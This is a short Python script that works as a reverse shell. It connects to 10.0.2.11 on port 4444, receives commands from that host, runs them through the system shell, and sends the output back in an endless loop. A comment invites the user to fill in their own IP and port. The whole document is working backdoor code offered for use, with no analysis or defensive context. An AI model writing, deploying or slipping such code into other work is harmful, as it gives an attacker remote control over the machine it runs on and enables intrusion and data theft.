import socket,subprocess


def exec_cmd(command):
   return subprocess.check_output(command,shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.11", 4444))  #Enter ip,port according to you as tuple
connection.send("[+]Connected remotely")

while True:
    command=connection.recv(1024)
    cmd_out=exec_cmd(command)
    connection.send(cmd_out)

connection.close()
